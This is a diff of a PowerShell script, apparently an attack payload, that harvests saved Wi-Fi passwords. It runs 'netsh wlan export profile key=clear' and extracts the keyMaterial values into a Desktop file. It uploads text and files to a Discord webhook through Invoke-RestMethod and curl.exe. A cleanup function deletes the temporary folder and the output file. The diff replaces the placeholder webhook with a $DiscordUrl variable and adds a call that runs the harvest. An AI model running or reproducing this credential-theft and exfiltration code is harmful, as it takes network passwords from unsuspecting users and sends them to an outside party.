@@ -19,7 +19,7 @@ param (
     [string]$text 
 )
 
-$hookurl = 'YOUR-DISCORD-WEBHOOK'
+
 
 $Body = @{
   'username' = $env:username
@@ -27,9 +27,9 @@ $Body = @{
 }
 
 if (-not ([string]::IsNullOrEmpty($text))){
-Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};
+Invoke-RestMethod -ContentType 'Application/Json' -Uri $DiscordUrl  -Method Post -Body ($Body | ConvertTo-Json)};
 
-if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
+if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $DiscordUrl}
 }
 
 function Create-Wifi-File {
@@ -38,16 +38,13 @@ $desktop = ([Environment]::GetFolderPath("Desktop"))
 New-Item -Path $env:temp -Name "js2k3kd4nne5dhsk" -ItemType "directory"
 Set-Location -Path "$env:temp/js2k3kd4nne5dhsk"; netsh wlan export profile key=clear
 Select-String -Path *.xml -Pattern 'keyMaterial' | % { $_ -replace '</?keyMaterial>', ''} | % {$_ -replace "C:\\Users\\$env:UserName\\Desktop\\", ''} | % {$_ -replace '.xml:22:', ''} > $desktop\0.txt
-
 }
 
 function Del-Wifi-File {
-
 Set-Location -Path "$env:temp"
 Remove-Item -Path "$env:tmp/js2k3kd4nne5dhsk" -Force -Recurse;rm $desktop\0.txt
 exit
  }
-
-
+Create-Wifi-File
 
 
